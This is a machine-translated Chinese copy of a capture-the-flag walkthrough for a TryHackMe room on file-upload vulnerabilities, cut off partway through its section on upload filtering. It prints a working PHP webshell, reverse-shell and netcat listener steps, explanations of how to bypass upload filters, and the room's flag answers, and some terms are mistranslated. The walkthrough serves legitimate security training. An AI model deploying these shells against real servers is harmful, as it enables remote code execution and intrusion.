<html>
<head>
<title>Upload Vulnerabilities TryHackme Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">上传漏洞TryHackme书面报告</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/upload-vulnerabilities-tryhackme-writeup-f6fba1dad902?source=collection_archive---------0-----------------------#2021-05-05">https://infosecwriteups.com/upload-vulnerabilities-tryhackme-writeup-f6fba1dad902?source=collection_archive---------0-----------------------#2021-05-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="310b" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated"><strong class="ak">这是Tryhackme room“上传漏洞”的文字记录</strong></h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi kf"><img src="../Images/3066487072a2eab77074a659dc4310ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1090/format:webp/1*0kKdNFbnYsSYHCGkkgmtxQ.png"/></div><figcaption class="kn ko gj gh gi kp kq bd b be z dk translated">https://tryhackme.com/room/uploadvulns<a class="ae kr" href="https://tryhackme.com/room/uploadvulns" rel="noopener ugc nofollow" target="_blank"/></figcaption></figure><p id="22a4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">https://tryhackme.com/room/uploadvulns<br/><strong class="ku ir">注:此房间只对高级会员开放。谁购买了高级会员。</strong></p><p id="60f8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">教程室探索网站中一些基本的文件上传漏洞。首先，让我们部署机器，让它有几分钟的启动时间。<em class="lo">利用MIME和幻数攻击TryHackMe上传漏洞</em></p><p id="656e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">本演练室最终任务需要测试和解决的技能有:<strong class="ku ir">反壳</strong>、<strong class="ku ir">打嗝套件</strong>、<strong class="ku ir">上传漏洞</strong>、<strong class="ku ir">客户端绕过扩展过滤</strong>。</p><p id="328f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">首先，让我们部署机器，让它有几分钟的启动时间。</p><p id="1ae9" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">单击“部署”后，您需要配置自己的计算机以便能够连接。<br/> <em class="lo">(注意:对于TryHackMe机器来说，这是一个不正常的步骤，但必须完成才能访问此房间的实际内容)</em></p><p id="728d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果您已经成功地部署了机器，那么下面的命令将已经填充了IP地址。如果其中任何一个包含“MACHINE_IP ”,那么您仍然需要部署机器，下面的指令将不起作用。</p></div><div class="ab cl lp lq hu lr" role="separator"><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu"/></div><div class="ij ik il im in"><h1 id="088a" class="lw lx iq bd ly lz ma mb mc md me mf mg jw mh jx mi jz mj ka mk kc ml kd mm mn bi translated">任务1开始</h1><p id="1391" class="pw-post-body-paragraph ks kt iq ku b kv mo jr kx ky mp ju la lb mq ld le lf mr lh li lj ms ll lm ln ij bi translated"><strong class="ku ir">如果你使用的是Linux或者MacOS </strong>，打开一个终端，输入下面的命令，然后回车:</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="285b" class="my lx iq mu b gy mz na l nb nc">echo "MACHINE_IP    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm" | sudo tee -a /etc/hosts</span></pre><p id="d2c7" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">完成房间后，运行以下命令将主机文件恢复正常:</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="acf0" class="my lx iq mu b gy mz na l nb nc">sudo sed -i '$d' /etc/hosts</span></pre><p id="361d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">如果您正在使用Windows </strong>，通过搜索“Powershell”，右键单击“Windows Powershell”，然后单击“以管理员身份运行”，打开管理员Powershell窗口。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nd"><img src="../Images/ca51ac9bec105102f178c05648c6e833.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*BSA7GjA5-hTWDvqr"/></div></div></figure><p id="2109" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">键入以下命令并按enter键:</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="bffd" class="my lx iq mu b gy mz na l nb nc">AC C:\Windows\System32\drivers\etc\hosts "MACHINE_IP   overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm"</span></pre><p id="fa36" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">完成房间后，使用以下命令将主机文件恢复正常:</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="0bbb" class="my lx iq mu b gy mz na l nb nc">(GC C:\Windows\System32\drivers\etc\hosts | select -Skiplast 1) | SC C:\Windows\System32\drivers\etc\hosts</span></pre><p id="ed1f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">您现在应该能够访问虚拟机了，让我们开始吧！</p><h1 id="7e9d" class="lw lx iq bd ly lz ni mb mc md nj mf mg jw nk jx mi jz nl ka mk kc nm kd mm mn bi translated">任务2简介</h1><p id="d31e" class="pw-post-body-paragraph ks kt iq ku b kv mo jr kx ky mp ju la lb mq ld le lf mr lh li lj ms ll lm ln ij bi translated">这个房间的目的是探索由于不正确(或不充分)处理文件上传而导致的一些漏洞。具体来说，我们将关注:</p><ul class=""><li id="f746" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln ns nt nu nv bi translated">覆盖服务器上的现有文件</li><li id="8649" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln ns nt nu nv bi translated">在服务器上上传和执行Shells</li><li id="6832" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln ns nt nu nv bi translated">绕过客户端过滤</li><li id="d451" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln ns nt nu nv bi translated">绕过各种服务器端过滤</li><li id="1b3e" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln ns nt nu nv bi translated">愚弄内容类型验证检查</li></ul><h1 id="e1ac" class="lw lx iq bd ly lz ni mb mc md nj mf mg jw nk jx mi jz nl ka mk kc nm kd mm mn bi translated">任务4覆盖现有文件</h1><p id="59fb" class="pw-post-body-paragraph ks kt iq ku b kv mo jr kx ky mp ju la lb mq ld le lf mr lh li lj ms ll lm ln ij bi translated">在您亲自尝试之前，让我们先看一个例子。请注意，demo.uploadvulns.thm将用于所有演示；但是，该站点在上传的虚拟机中不可用。这纯粹是为了演示的目的。</p><p id="2c27" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在下图中，我们有一个带有上传表单的网页:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/4e8a2371a1a1799fa43c99be922286b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1110/0*VUnELMtBAA-gjFET"/></div></figure><p id="b457" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">对于真正的挑战，您可能需要列举更多的内容；但是，在这种情况下，让我们只看一下页面的源代码:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/bf5319e8d0bda416935816fb248a6e48.png" data-original-src="https://miro.medium.com/v2/resize:fit:1324/0*3h9jkuFCBhplBHnF"/></div></figure><p id="2f84" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在红框内，我们看到了负责显示我们在页面上看到的图像的代码。它来自一个名为“spaniel.jpg”的文件，在一个名为“images”的目录下。</p><p id="a6a4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在我们知道图像是从哪里提取的，我们能覆盖它吗？</p><p id="6f82" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们从网上下载另一张图片，称之为spaniel.jpg<strong class="ku ir"/>。然后，我们将它上传到网站，看看我们是否可以覆盖现有的图像:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi od"><img src="../Images/8c45eab147f7f25d6b4b59b06dc5afaa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*sUqS3ZTA1Ra2kwds"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/2db3baf09d8c2b5ed59f7aa137414cc2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1236/0*hgWibQuHnsiriO4m"/></div></figure><p id="3891" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们的攻击成功了！我们设法用自己的副本覆盖了原始的<strong class="ku ir">图片/spaniel.jpg </strong>。</p><p id="4f5c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在，让我们把这个付诸实践。</p><p id="b1b9" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">打开网络浏览器，导航至<strong class="ku ir">overwrite . uploadvulns . thm</strong>。你的目标是用你自己的上传覆盖服务器上的文件。</p><ol class=""><li id="0b5a" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln of nt nu nv bi translated">可以被覆盖的图像文件的名称是什么？</li></ol><blockquote class="og oh oi"><p id="519f" class="ks kt lo ku b kv kw jr kx ky kz ju la oj lc ld le ok lg lh li ol lk ll lm ln ij bi translated"><strong class="ku ir">答案:mountains.jpg</strong></p></blockquote><ol class=""><li id="78e7" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln of nt nu nv bi translated">覆盖图像。你收到的国旗是什么？</li></ol><blockquote class="og oh oi"><p id="e66a" class="ks kt lo ku b kv kw jr kx ky kz ju la oj lc ld le ok lg lh li ol lk ll lm ln ij bi translated"><strong class="ku ir">答案:THM { otbiodq 3 ymnjywzhm 2 uymmyzdnizji 5 }</strong></p></blockquote><h1 id="9efb" class="lw lx iq bd ly lz ni mb mc md nj mf mg jw nk jx mi jz nl ka mk kc nm kd mm mn bi translated">任务5远程代码执行</h1><p id="f364" class="pw-post-body-paragraph ks kt iq ku b kv mo jr kx ky mp ju la lb mq ld le lf mr lh li lj ms ll lm ln ij bi translated">覆盖服务器上存在的文件是一件好事。这对维护站点的人来说是个麻烦，可能会导致一些漏洞，但是让我们更进一步；让我们去RCE吧！</p><p id="41c8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">Web外壳:</p><p id="a5cd" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">假设我们找到了一个带有上传表单的网页:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi om"><img src="../Images/cdd90d8ad30d7ab5357d9ccab036705c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1022/0*_-eLqp7N9MgX07SW"/></div></figure><p id="5056" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们将何去何从？好吧，让我们从一个gobuster扫描开始:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi on"><img src="../Images/7d0fe227551188175d20160db3f1726d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*b8SsUKFRwhRx_a1j"/></div></div></figure><p id="5bf8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">看起来我们这里有两个目录— <code class="fe oo op oq mu b">uploads</code>和<code class="fe oo op oq mu b">assets</code>。其中，我们上传的任何文件都可能被放在“上传”目录中。我们将首先尝试上传一个合法的图像文件。在这里，我选择了上一个任务中可爱狗狗的照片:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi or"><img src="../Images/6c570367dbb08983d066d08a8c15eebc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1298/0*MFSWjOvI3qMojXt4"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi or"><img src="../Images/00e4e369091152f7461a5729af461e1a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1298/0*TZmteMZfE-zHlJUh"/></div></figure><p id="6d18" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在，如果我们去<a class="ae kr" href="http://demo.uploadvulns.thm/uploads" rel="noopener ugc nofollow" target="_blank">http://demo.uploadvulns.thm/uploads</a>我们应该看到西班牙猎犬的图片已经上传了！</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi or"><img src="../Images/1f1696b07ff593dd367bab7ba0ee8e4c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1298/0*7dr-eBpqDbA0_om9"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi os"><img src="../Images/64294204cef94ff1ce53819d81f87822.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*YjWKnI1CDSfYgRye"/></div></div></figure><p id="693c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">好了，我们可以上传图像了。现在让我们尝试一个webshell。</p><p id="a163" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">事实上，我们知道这个web服务器是用PHP后端运行的，所以我们将直接跳到创建和上传shell。现实生活中，我们可能需要多做一点枚举；然而，无论如何，PHP都是一个很好的起点。</p><p id="7048" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">一个简单的webshell的工作方式是接受一个参数并将其作为系统命令执行。在PHP中，这样做的语法是:</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="0990" class="my lx iq mu b gy mz na l nb nc">&lt;?php<br/>    echo system($_GET["cmd"]);<br/>?&gt;</span></pre><p id="f4eb" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这段代码接受一个GET参数，并将其作为系统命令执行。然后它将输出回显到屏幕上。</p><p id="7b9f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们试着把它上传到站点，然后用它来显示我们当前的用户和当前目录的内容:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi ot"><img src="../Images/4511db06f9d870c693d81dd5e6c8212d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*x-vH0f_GBh-djQ9f"/></div></div></figure><p id="d9d8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">成功！</p><p id="a360" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们现在可以使用这个shell从系统中读取文件，或者从这里升级到反向shell。现在我们有了RCE，选择是无限的。注意，当使用webshells时，通过查看页面的源代码来查看输出通常更容易。这极大地改进了输出的格式。</p><p id="5e6b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">反向炮弹:</strong></p><p id="bc92" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">上传反向shell的过程与上传webshell的过程几乎相同，因此这一部分会更短。我们将使用无处不在的Pentest Monkey reverse shell，它默认出现在Kali Linux上，但也可以从这里下载<a class="ae kr" href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" rel="noopener ugc nofollow" target="_blank"/>。您需要编辑shell的第49行。它现在会说</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="7020" class="my lx iq mu b gy mz na l nb nc">$ip = '127.0.0.1';  // CHANGE THIS</span></pre><p id="b0ab" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">—按照指示，将<code class="fe oo op oq mu b">127.0.0.1</code>更改为您的TryHackMe tun0 IP地址，该地址可在<a class="ae kr" href="https://tryhackme.com/access" rel="noopener ugc nofollow" target="_blank">访问页面</a>上找到。下面这一行也要求更改，可以忽略。编辑完shell后，我们需要做的下一件事是启动一个Netcat监听器来接收连接。<code class="fe oo op oq mu b">nc -lvnp 1234</code>:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/8a45f7289ac85b7792c8446e70bf313a.png" data-original-src="https://miro.medium.com/v2/resize:fit:702/0*HJIQS6Zpen3PDPiz"/></div></figure><p id="5226" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在，让我们上传shell，然后通过导航到<a class="ae kr" href="http://demo.uploadvulns.thm/uploads/shell.php" rel="noopener ugc nofollow" target="_blank">http://demo.uploadvulns.thm/uploads/shell.php</a>来激活它。这个shell的名字很明显就是您给它起的名字(默认为<code class="fe oo op oq mu b">php-reverse-shell.php</code>)。</p><p id="ea65" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">网站应该会挂起，不能正常加载——但是，如果我们切换回我们的终端，我们有一个点击！</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi ov"><img src="../Images/a14f74c5e74a7b0a241aa1854dc67334.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*z_Q_1knN2Yu-_OA2"/></div></div></figure><p id="5b58" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">再一次，我们在这个网络服务器上获得了RCE。从这里开始，我们希望稳定我们的外壳，提升我们的特权，但这些是以后的任务。现在，是你自己尝试一下的时候了！</p><p id="28db" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">导航至<code class="fe oo op oq mu b">shell.uploadvulns.thm</code>并完成该任务的问题。</p><ol class=""><li id="a7b6" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln of nt nu nv bi translated">使用上面截图中的语法在网站上运行Gobuster扫描。什么目录看起来像是上传用的？(注意:这是一个需要养成的好习惯，在接下来的任务中会对你大有裨益……)</li></ol><h2 id="1dad" class="my lx iq bd ly ow ox dn mc oy oz dp mg lb pa pb mi lf pc pd mk lj pe pf mm pg bi translated">Gobuster</h2><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="130f" class="my lx iq mu b gy mz na l nb nc">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <a class="ae kr" href="http://shell.uploadvulns.thm" rel="noopener ugc nofollow" target="_blank">http://shell.uploadvulns.thm</a></span></pre><p id="e77e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">/资源(状态:301)<br/>/资产(状态:301)</p><p id="85b6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><a class="ae kr" href="http://shell.uploadvulns.thm/resources/" rel="noopener ugc nofollow" target="_blank">http://shell.uploadvulns.thm/resources/</a></p><ol class=""><li id="4490" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln of nt nu nv bi translated">在机器上获取web shell或反向shell。服务器的/var/www/目录中的标志是什么？</li></ol><p id="5e79" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">启动Netcat监听器</p><blockquote class="og oh oi"><p id="1644" class="ks kt lo ku b kv kw jr kx ky kz ju la oj lc ld le ok lg lh li ol lk ll lm ln ij bi translated"><strong class="ku ir"> nc -lnvp 9001 </strong></p></blockquote><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="2bfb" class="my lx iq mu b gy mz na l nb nc">$ cd /var/www/<br/>$ ls<br/>flag.txt<br/>html<br/>$ cat flag.txt<br/>THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}</span></pre><blockquote class="og oh oi"><p id="22d3" class="ks kt lo ku b kv kw jr kx ky kz ju la oj lc ld le ok lg lh li ol lk ll lm ln ij bi translated"><strong class="ku ir">答案:THM { ywfhy 2 u 3 zgi 4 N2 qxnmqzzjk 0 yjgzzdzk }</strong></p></blockquote><h1 id="58da" class="lw lx iq bd ly lz ni mb mc md nj mf mg jw nk jx mi jz nl ka mk kc nm kd mm mn bi translated">任务6过滤</h1><p id="ea7d" class="pw-post-body-paragraph ks kt iq ku b kv mo jr kx ky mp ju la lb mq ld le lf mr lh li lj ms ll lm ln ij bi translated">到目前为止，我们在很大程度上忽略了web开发者用来防御文件上传漏洞的反防御措施。到目前为止，这个房间里你成功攻击过的所有网站都是完全不安全的。是时候改变了。从现在开始，我们将研究一些用于防止恶意文件上传的防御机制，以及如何规避它们。</p><p id="0c12" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">首先，让我们讨论客户端过滤和服务器端过滤的区别。</p><p id="dfc0" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在web应用程序的上下文中，当我们谈论“客户端”脚本时，我们指的是它运行在用户的浏览器中，而不是在web服务器本身上。JavaScript作为客户端脚本语言几乎无处不在，尽管也存在替代语言。无论使用何种语言，客户端脚本都将在您的web浏览器中运行。在文件上传的上下文中，这意味着过滤甚至发生在文件上传到服务器之前。理论上，这似乎是一件好事，对吗？在一个理想的世界里，它会是；然而，因为过滤是在我们的计算机上进行的，所以很容易绕过它。因此，客户端过滤本身是一种非常不安全的验证上传文件没有恶意的方法。</p><p id="70cc" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">相反，正如您可能已经猜到的，服务器端脚本将在服务器上运行。传统上，PHP是主要的服务器端语言；然而，近年来，其他选项(C#、Node.js、Python、Ruby on Rails以及其他各种选项)得到了更广泛的使用。服务器端过滤往往更难绕过，因为您面前没有代码。由于代码是在服务器上执行的，在大多数情况下，完全绕过过滤器也是不可能的；相反，我们必须形成一个有效载荷，它符合适当的过滤器，但仍然允许我们执行我们的代码。</p><p id="1c50" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">记住这一点，让我们看看一些不同种类的过滤。</p><p id="dbf7" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">扩展验证:</p><p id="88ac" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">文件扩展名(理论上)用于标识文件的内容。实际上它们很容易改变，所以实际上没有多大意义；然而，MS Windows仍然使用它们来识别文件类型，尽管基于Unix的系统倾向于依赖于其他方法，我们稍后会谈到。检查扩展名的过滤器以两种方式之一工作。它们或者将扩展列入黑名单(即，具有不允许的扩展的列表)，或者将扩展列入白名单(即，具有允许的扩展的列表，并拒绝其他所有扩展)。</p><p id="88e8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">文件类型过滤:</strong></p><p id="c0f7" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">与扩展名验证类似，但更为深入，文件类型过滤再次检查文件内容是否可以上传。我们将了解两种类型的文件类型验证:</p><ul class=""><li id="f41a" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln ns nt nu nv bi translated"><strong class="ku ir"> MIME验证:MIME(多用途互联网邮件扩展)</strong>类型被用作文件的标识符——最初是在通过电子邮件作为附件传输时，但现在也在通过HTTP传输文件时使用。文件上传的MIME类型附加在请求的报头中，如下所示:</li></ul><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi ph"><img src="../Images/f74ce888531373bbd0ba36c1422de9d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*OyJMKIhGQFD42A-Q"/></div></div></figure><ul class=""><li id="31a6" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln ns nt nu nv bi translated">MIME类型遵循格式<type> / <subtype>。在上面的请求中，您可以看到图像“spaniel.jpg”被上传到服务器。作为合法的JPEG图像，这次上传的MIME类型是“image/jpeg”。可以在客户端和/或服务器端检查文件的MIME类型；然而，由于MIME是基于文件的扩展名，这是非常容易绕过的。</subtype></type></li><li id="efc7" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln ns nt nu nv bi translated">幻数验证:幻数是确定文件内容的更准确的方法；虽然，他们绝不是不可能伪造的。文件的“幻数”是文件内容最开头的一串字节，用于标识内容。例如，一个PNG文件在文件的最顶端会有这些字节:89 50 4E 47 0D 0A 1A 0A。</li></ul><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi pi"><img src="../Images/05b4e94bfa28d1e1d0e61bafead35d49.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*kUPay7LafvVVt-Q9"/></div></div></figure><ul class=""><li id="66dd" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln ns nt nu nv bi translated">与Windows不同，Unix系统使用幻数来识别文件；但是，在处理文件上传时，可以检查上传文件的幻数，以确保可以安全接受。这绝不是一个有保证的解决方案，但它比检查文件的扩展名更有效。</li></ul><p id="2acf" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">文件长度过滤:</strong></p><p id="e3e8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">文件长度过滤器用于防止大型文件通过上传表单上传到服务器(因为这可能会导致服务器资源不足)。在大多数情况下，当我们上传shells时，这不会给我们带来任何问题；但是，值得记住的是，如果上传表单只希望上传一个非常小的文件，那么可能会有一个长度过滤器来确保遵守文件长度要求。举个例子，上一个任务中我们完全成熟的PHP反向shell有5.4Kb大——相对来说很小，但是如果表单期望最大2Kb，那么我们需要找到一个替代的shell来上传。</p><p id="9295" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">文件名过滤:</strong></p><p id="1252" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如前所述，上传到服务器的文件应该是唯一的。通常这意味着给文件名添加一个随机的方面，然而，另一种策略是检查服务器上是否已经存在同名的文件，如果存在，则给用户一个错误。此外，应在上传时对文件名进行清理，以确保它们不包含任何“坏字符”，这些“坏字符”可能会在上传时导致文件系统出现问题(例如，Linux上的空字节或正斜杠，以及控制字符，如<code class="fe oo op oq mu b">;</code>和可能的unicode字符)。这对我们来说意味着，在一个管理良好的系统上，我们上传的文件不太可能与我们上传前给它们的名字相同，所以请注意，如果您设法绕过内容过滤，您可能不得不寻找您的shell。</p><p id="871f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky 